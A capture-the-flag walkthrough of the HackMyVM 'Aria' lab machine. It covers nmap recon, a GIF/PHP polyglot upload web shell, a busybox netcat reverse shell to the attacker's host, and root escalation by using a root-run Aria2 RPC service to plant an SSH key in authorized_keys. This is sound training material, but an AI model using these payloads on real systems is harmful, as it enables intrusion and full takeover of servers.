# Aria

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| **Aria** | **Sublarge** | **Beginner** | **HackMyVM** |

**Summary:** Aria is a beginner-level Boot2Root machine that tests skills in interacting with custom shells, bypassing web filters, and exploiting misconfigured RPC services. The attack begins with the discovery of a Custom Debug Shell on port 1337, which leaks internal upload paths. This information is combined with an Unrestricted File Upload vulnerability on a PHP-based web server, where a Polyglot GIF/PHP file is used to bypass content filters and achieve Remote Code Execution (RCE). After gaining initial access, Zero-Width Steganography is identified within the user flag to retrieve a hidden authentication token. Privilege Escalation is performed by abusing an Aria2 RPC Service running as root, using the discovered token to perform an SSH Key Injection for full system compromise.

---

## Recon

First of all I started with scanning the IP of the `Aria`

```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l -I eth1
Interface: eth1, type: EN10MB, MAC: 08:00:27:dc:38:4b, IPv4: 192.168.100.5
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   0a:00:27:00:00:03       (Unknown: locally administered)
192.168.100.2   08:00:27:9c:dd:0d       (Unknown)
192.168.100.4   08:00:27:23:fa:28       (Unknown)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.039 seconds (125.55 hosts/sec). 3 responded
```
Target IP `192.168.100.4`

Let's do enumeration using `nmap`:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- 192.168.100.4
-----[SNIP]-----
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Ultra-Secure Naming Service
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|   GenericLines:
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found:
|     Command not found:
-----[SNIP]-----
```

There are three ports opened `22, 80, 1337` 

## Init Access
First, I tried accessing port 1337 using `nc` and obtained a webshell. However, this webshell does not use standard Linux commands, so I had to experiment to find out which commands were available. After a while, I found an interesting command called `showpath`, but it was empty.

```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.100.4 1337
--- Aria Debug Shell ---
--- Type 'exit' to quit ---

$ id
Command not found: id
$ ls
Command not found: ls
$ env
Command not found: env
$ path
You're close! Try a command related to revealing paths.
-----[SNIP]-----
$ show path
You're close! Try a command related to revealing paths.
$ show path now
You're close! Try a command related to revealing paths.
$ showpath
--- Upload Paths ---
Log file not found.
--- End of Log ---
$ exit
Connection closed.
```
I moving on to the web server, but because the text is in chinese and I can't read it, I need this to be translated.

![alt text](image.png)

From that, I could see some of information like:
- The file paths is generated using md5(time()-rand(1,1000))
- Only gif/jpg/png with size <= 1MB is accepted
- and the last, the content must not contain any <?php

Clicking Try it now, it bring me to the upload file section.
In this situation looks like i'll be able to do upload malicious file but i'll be need to read the file path.

So, I try to upload random photo on to it, and when I checked the web shell I've got something:

```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.100.4 1337
--- Aria Debug Shell ---
--- Type 'exit' to quit ---

$ showpath
--- Upload Paths ---
Sun 28 Dec 2025 01:45:12 AM EST: New file created: /var/www/html/uploads/8131810b62e4af98697f69e66d508eb6.jpg
--- End of Log ---
$ exit
Connection closed.
```

I navigated to the file path on the web server, which proved that my random photo was leaked.

Trying understand all the information, i think i can do upload malicious file that will leads to RCE.

preparing the payload:

```
┌──(kali㉿kali)-[~/hackmyvm/aria]
└─$ echo 'GIF819a' > poison.gif

┌──(kali㉿kali)-[~/hackmyvm/aria]
└─$ echo '<?= exec($_GET['0']); ?>' >> poison.gif

┌──(kali㉿kali)-[~/hackmyvm/aria]
└─$ cat poison.gif
GIF819a
<?= exec($_GET[0]); ?>
```

Upload that gif file and read the file path:

```
┌──(kali㉿kali)-[~/hackmyvm/aria]
└─$ nc 192.168.100.4 1337
--- Aria Debug Shell ---
--- Type 'exit' to quit ---

$ showpath
--- Upload Paths ---
Sun 28 Dec 2025 01:45:12 AM EST: New file created: /var/www/html/uploads/8131810b62e4af98697f69e66d508eb6.jpg
Sun 28 Dec 2025 01:51:43 AM EST: New file created: /var/www/html/uploads/97e72588bd42a2d3cd8741c2151062e4.gif
--- End of Log ---
```

Access the file path and I got RCE:

![alt text](image-2.png)
![alt text](image-1.png)

Setup a listener on kali machine:
```
┌──(kali㉿kali)-[~/hackmyvm/aria]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

now, trying to spawn a shell using payload `busybox nc 192.168.100.5 4444 -e /bin/bash`
![alt text](image-3.png)

And just like that Got the shell!

```
┌──(kali㉿kali)-[~/hackmyvm/aria]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.100.5] from (UNKNOWN) [192.168.100.4] 54708
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

becase the shell is'nt stable enough spawned tty:
```
/usr/bin/script -qc /bin/bash /dev/null
www-data@Aria:/var/www/html/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

When I read the user.txt for the flag there is slightly a space, before the `www-data@Aria`:
![alt text](image-4.png)

try to see if there any hidden character or something:
![alt text](image-5.png)
Indeed, there are hidden message look like. Go to https://stegzero.com/, copy the contain of `user.txt` and check it:

![alt text](image-6.png)

Got a token, idk for sure what's the use of this.

## PrivEsc 

Now, let's find out how to get root access

First, let's check what services are currently running
```
www-data@Aria:/home/aria$ ss -tulnp
ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port
-----[SNIP]-----
tcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*
-----[SNIP]-----
```

There is another service running on localhost; let's find out what it is. Target Analysis: Port 6800 (Aria2). Since the machine's name is "Aria", it is highly likely that port 6800 is the Aria2 RPC service. Aria2 is a powerful download utility, and if misconfigured, it can be used to read or write files on the system as the user running it.
When I tried to read the version, it was rejected:
```
www-data@Aria:/home/aria$ curl -X POST -d '{"jsonrpc":"2.0","method":"aria2.getVersion","id":"1"}' http://127.0.0.1:6800/jsonrpc
{"id":"1","jsonrpc":"2.0","error":{"code":1,"message":"Unauthorized"}}
```

Identify if there are any services being run by root:

```
www-data@Aria:/home/aria$ ps aux | grep aria
ps aux | grep aria
root         332  0.0  0.1  56660  2476 ?        Ss   01:31   0:02 /usr/bin/aria2c --conf-path=/root/.aria2/aria2.conf
-----[SNIP]-----
```

It turns out the Aria2 service is running as root, which means we can perform privilege escalation by placing our machine's root SSH public key into the Aria machine.

First, set up a local web server hosting your SSH public key on `.ssh` dir so the file can be access directly.
```
┌──(root㉿kali)-[~/.ssh]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After that, use aria2 to download the root SSH public key:
```
www-data@Aria:/home/aria$ curl -X POST -d '{"jsonrpc":"2.0","method":"aria2.addUri","id":"1","params":["token:maze-sec",["http://192.168.100.5/id_rsa.pub"],{"dir":"/root/.ssh","out":"authorized_keys"}]}' http://127.0.0.1:6800/jsonrpc
{"id":"1","jsonrpc":"2.0","result":"902be29dc2b1fc29"}
```

Successfully downloaded! The same status is reflected on the local web server:
```
┌──(root㉿kali)-[~/.ssh]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.4 - - [28/Dec/2025 16:11:14] "GET /id_rsa.pub HTTP/1.1" 200 -
```

Time to log in as root to the Aria machine
```
┌──(root㉿kali)-[~/.ssh]
└─# ssh root@192.168.100.4 -i id_rsa
Linux Aria 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec 28 04:07:50 2025 from 192.168.100.5
root@Aria:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Aria:~# cat /root/root.txt
flag{root-[REDACTED]}
```